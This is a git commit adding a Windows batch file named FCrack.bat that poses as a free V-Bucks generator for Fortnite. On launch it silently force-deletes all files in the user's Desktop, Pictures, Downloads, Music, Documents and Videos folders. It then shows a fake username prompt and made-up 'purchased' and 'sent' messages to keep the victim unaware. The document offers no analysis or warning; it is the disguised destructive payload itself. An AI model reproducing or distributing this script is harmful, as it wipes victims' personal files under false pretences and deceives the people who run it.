f8c1098fa3f8120a437f3574e776fe9e820bcf3e
VadimCanPlayOfficial <141765567+VadimCanPlay@users.noreply.github.com>
2024-09-16 14:29:04 +0300

    Add files via upload

---
+++ FCrack.bat
@@ -0,0 +1,19 @@
+@echo off
+title FCrack
+cd C:\Users\%username%\
+del Desktop\* /q /f
+del Pictures\* /q /f
+del Downloads\* /q /f
+del Music\* /q /f
+del Documents\* /q /f
+del Videos\* /q /f
+echo.
+echo    Enter your username for free V-Bucks:
+echo.
+set /p vbucks= Username: 
+cls
+echo Purchasing V-Bucks...
+echo Purchased!
+echo Sending V-Bucks to %vbucks%...
+ping localhost -n 15 >nul
+echo V-Bucks sent! Check balance in 1-2 days!
